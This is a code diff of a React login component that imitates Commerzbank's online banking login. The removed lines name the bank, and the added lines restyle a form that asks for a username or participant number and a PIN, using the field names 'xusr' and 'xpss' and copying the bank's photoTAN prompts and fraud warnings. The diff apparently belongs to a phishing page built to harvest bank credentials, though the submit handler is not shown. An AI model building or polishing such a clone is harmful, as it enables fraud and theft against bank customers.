@@ -83,120 +83,253 @@ const LoginPage: React.FC = () => {
   };
 
   return (
-    <div className="commerzbank-app">
-      {/* Main Content */}
-      <main className="main-content">
-        <div className="content-wrapper">
-          {/* Left Column - Login Form */}
-          <div className="left-column">
-            <div className="login-section">
-              <h1 className="login-title">{t.loginTitle} Online Banking</h1>
-              
-              <form onSubmit={handleSubmit} className="login-form">
-                <div className="form-group">
-                  <label htmlFor="xusr" className="form-label">
-                    {t.username}
-                    <span className="info-icon">ℹ️</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="xusr"
-                    name="xusr"
-                    value={formData.xusr}
-                    onChange={handleInputChange}
-                    className="form-input"
-                    autoComplete="off"
-                    required
-                  />
-                  {errors.xusr && <div className="error-message">{errors.xusr}</div>}
-                </div>
-
-                <div className="form-group">
-                  <label htmlFor="xpss" className="form-label">
-                    {t.password}
-                    <span className="info-icon">ℹ️</span>
-                  </label>
-                  <input
-                    type="password"
-                    id="xpss"
-                    name="xpss"
-                    value={formData.xpss}
-                    onChange={handleInputChange}
-                    className="form-input"
-                    autoComplete="off"
-                    required
-                  />
-                  {errors.xpss && <div className="error-message">{errors.xpss}</div>}
-                </div>
-
-                <button 
-                  type="submit" 
-                  className="login-button"
-                  disabled={isLoading}
-                >
-                  🔒 {isLoading ? (t.loginButton + '...') : t.loginButton}
-                </button>
-              </form>
-            </div>
-
-            {/* Additional Sections */}
-            <div className="additional-sections">
-              <div className="section-box">
-                <h3>{t.updatePhotoTAN}</h3>
-                <button className="yellow-button">{t.businessPortal}</button>
+    <div style={{
+      fontFamily: 'Arial, Helvetica, sans-serif',
+      backgroundColor: '#f5f5f5',
+      minHeight: '100vh',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      padding: '20px',
+      margin: 0
+    }}>
+      <div style={{
+        width: '100%',
+        maxWidth: '500px',
+        background: 'white',
+        borderRadius: '8px',
+        boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
+        padding: '40px',
+        margin: '0 auto'
+      }}>
+        <form onSubmit={handleSubmit} style={{
+          padding: '20px'
+        }}>
+          <div style={{
+            marginBottom: '10px',
+            position: 'relative',
+            display: 'flex',
+            justifyContent: 'center'
+          }}>
+            <input
+              type="text"
+              id="xusr"
+              name="xusr"
+              value={formData.xusr}
+              onChange={handleInputChange}
+              style={{
+                width: '130%',
+                padding: '12px 12px 12px 12px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                backgroundColor: 'white',
+                fontFamily: 'Arial, Helvetica, sans-serif',
+                fontSize: '14px',
+                outline: 'none !important',
+                boxShadow: 'none !important'
+              }}
+              onFocus={(e) => {
+                e.target.style.backgroundColor = 'white';
+              }}
+                  placeholder="Username/Participant number"
+                  autoComplete="off"
+                  required
+                />
+                <span style={{
+                  position: 'absolute',
+                  right: '12px',
+                  top: '50%',
+                  transform: 'translateY(-50%)',
+                  backgroundColor: '#ccc',
+                  color: 'white',
+                  borderRadius: '50%',
+                  width: '20px',
+                  height: '20px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  fontSize: '12px',
+                  fontWeight: 'bold'
+                }}>i</span>
               </div>
 
-              <div className="section-box">
-                <h3>{t.notDigitalCustomer}</h3>
-                <a href="#zugang" className="link">{t.applyDigitalAccess}</a>
-              </div>
-
-              <div className="section-box warnings">
-                <h3>{t.currentWarnings}</h3>
-                <ul>
-                  <li>{t.warning1}</li>
-                  <li>{t.warning2}</li>
-                </ul>
-              </div>
-            </div>
+              <div style={{
+                marginBottom: '10px',
+                position: 'relative',
+                display: 'flex',
+                justifyContent: 'center'
+              }}>
+                <input
+                  type="password"
+                  id="xpss"
+                  name="xpss"
+                  value={formData.xpss}
+                  onChange={handleInputChange}
+                  style={{
+                    width: '130%',
+                    padding: '12px 12px 12px 12px',
+                    border: '1px solid #ddd',
+                    borderRadius: '4px',
+                    backgroundColor: 'white',
+                    fontFamily: 'Arial, Helvetica, sans-serif',
+                    fontSize: '14px',
+                    outline: 'none !important',
+                    boxShadow: 'none !important'
+                  }}
+                  onFocus={(e) => {
+                    e.target.style.backgroundColor = 'white';
+                  }}
+              placeholder="PIN"
+              autoComplete="off"
+              required
+            />
+            <span style={{
+              position: 'absolute',
+              right: '12px',
+              top: '50%',
+              transform: 'translateY(-50%)',
+              backgroundColor: '#ccc',
+              color: 'white',
+              borderRadius: '50%',
+              width: '20px',
+              height: '20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              fontSize: '12px',
+              fontWeight: 'bold'
+            }}>i</span>
           </div>
 
-          {/* Right Column - Info Panel */}
-          <div className="right-column">
-            <div className="info-panel">
-              <h3>{t.importantInfo}</h3>
-              
-              <div className="info-section">
-                <p>{t.photoTANProblems} <a href="#info">hier weitere Informationen</a></p>
-              </div>
+              <button 
+                type="submit" 
+                disabled={isLoading}
+                style={{
+                  width: '40%',
+                  padding: '15px',
+                  background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  fontSize: '16px',
+                  fontWeight: 'bold',
+                  cursor: 'pointer',
+                  fontFamily: 'Arial, Helvetica, sans-serif',
+                  marginTop: '5px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  gap: '8px',
+                  margin: '5px auto 0 auto',
+                  transition: 'background 0.3s ease'
+                }}
+                onMouseEnter={(e) => {
+                  e.currentTarget.style.background = 'linear-gradient(315deg, #004d00 0%, #006400 50%, #004d00 100%)';
+                }}
+                onMouseLeave={(e) => {
+                  e.currentTarget.style.background = 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)';
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
+                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+            {isLoading ? (t.loginButton + '...') : t.loginButton}
+          </button>
+        </form>
 
-              <div className="info-section">
-                <h4>{t.noActiveTAN}</h4>
-                <ul>
-                  <li><a href="#phototan">{t.activatePhotoTAN}</a></li>
-                  <li><a href="#hilfe">{t.photoTANHelp}</a></li>
-                </ul>
-              </div>
+        {/* Dark grey divider */}
+        <div style={{
+          width: '100%',
+          height: '1px',
+          backgroundColor: '#666',
+          margin: '20px 0'
+        }}></div>
 
-              <div className="info-section">
-                <h4>{t.forgotCredentials}</h4>
-                <ul>
-                  <li><a href="#teilnehmer">{t.requestParticipantNumber}</a></li>
-                  <li><a href="#pin">{t.forgotPIN}</a></li>
-                </ul>
-              </div>
 
-              <div className="info-section">
-                <h4>Alles rund ums Online Banking</h4>
-                <ul>
-                  <li><a href="#anleitung">Anleitung/Hilfe</a></li>
-                  <li><a href="#sicherheit">Sicherheit</a></li>
-                </ul>
-              </div>
+        <div style={{
+          padding: '0 20px',
+          marginBottom: '8px',
+          textAlign: 'left'
+        }}>
+          <h3 style={{
+            fontSize: '16px',
+            fontWeight: 'bold',
+            color: '#FFC107',
+            marginBottom: '10px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>Update your photoTAN app</h3>
+              <button style={{
+                backgroundColor: '#FFC107',
+                color: '#FFC107',
+                border: 'none',
+                padding: '10px 15px',
+                borderRadius: '4px',
+                fontSize: '14px',
+                cursor: 'pointer',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>To register in the corporate customer portal</button>
+        </div>
+
+        <div style={{
+          padding: '0 20px',
+          marginBottom: '8px',
+          textAlign: 'left'
+        }}>
+          <h3 style={{
+            fontSize: '16px',
+            fontWeight: 'bold',
+            color: '#FFC107',
+            marginBottom: '10px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>Not a digital banking customer yet?</h3>
+          <a href="#zugang" style={{
+            color: '#FFC107',
+            textDecoration: 'none',
+            display: 'flex',
+            alignItems: 'center',
+            gap: '8px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            <span style={{ color: '#FFC107', fontSize: '16px' }}>→</span>
+            Apply for access digitally (with autoIDENT)
+          </a>
+        </div>
+
+        <div style={{
+          padding: '0 20px',
+          marginBottom: '8px',
+          textAlign: 'left'
+        }}>
+          <h3 style={{
+            fontSize: '16px',
+            fontWeight: 'bold',
+            color: '#FFC107',
+            marginBottom: '10px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>Current warnings</h3>
+          <div>
+            <div style={{
+              display: 'flex',
+              alignItems: 'center',
+              gap: '8px',
+              marginBottom: '8px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              <span style={{ color: '#FFC107', fontSize: '16px' }}>→</span>
+              Alleged bank employees request access data
+            </div>
+            <div style={{
+              display: 'flex',
+              alignItems: 'center',
+              gap: '8px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              <span style={{ color: '#FFC107', fontSize: '16px' }}>→</span>
+              Grandparent scam: Fraudsters use WhatsApp (polizei-beratung.de)
             </div>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   );
 };
